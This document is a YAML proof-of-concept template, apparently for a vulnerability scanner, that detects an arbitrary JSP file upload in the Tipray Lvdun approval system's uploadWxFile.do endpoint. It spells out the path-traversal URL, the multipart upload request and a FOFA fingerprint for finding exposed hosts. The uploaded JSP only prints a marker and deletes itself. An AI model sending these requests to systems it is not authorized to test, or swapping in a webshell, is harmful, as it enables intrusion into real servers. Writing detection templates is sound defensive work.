id: poc-yaml-tipray-gsas-uploadwxfile-do-anyfile-upload
info:
  name: 天锐绿盾审批系统 uploadWxFile.do 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 天锐绿盾审批系统
  fofa: app="TIPPAY-绿盾审批系统"
variables:
  t1: random_str(5)
  t2: base64(t1)
requests:
- method: POST
  path: /trwfe/service/.%2E/config/uploadWxFile.do
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaKljzbg49Mq4ggLz
  data: '------WebKitFormBoundaryaKljzbg49Mq4ggLz

    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"

    Content-Type: application/octet-stream


    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--'
  expression: status_code == 200 && body == "true"
- method: GET
  path: /{{.t1}}.jsp
  expression: status_code == 200 && body == t2
transport: http
